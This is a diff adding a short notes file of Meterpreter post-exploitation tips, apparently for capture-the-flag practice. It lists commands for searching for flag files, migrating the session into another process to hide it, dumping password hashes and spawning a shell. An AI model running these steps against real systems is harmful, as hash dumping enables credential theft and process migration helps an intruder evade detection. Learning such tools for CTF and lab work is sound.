@@ -1,0 +1,12 @@
+
+- Tips/Tricks -
+ 
+meterpreter> search -f <file> # notable ex. *user*.txt *root*.txt *flag*.txt
+meterpreter> ps # shows running processes
+meterpreter> migrate <pid> # hide meterpreter into <pid>
+meterpreter> systeminfo # get systeminfo
+meterpreter> hashdump # dump hashes
+meterpreter> getuid # get current user information
+
+shell # try to generate a shell when you need one
+
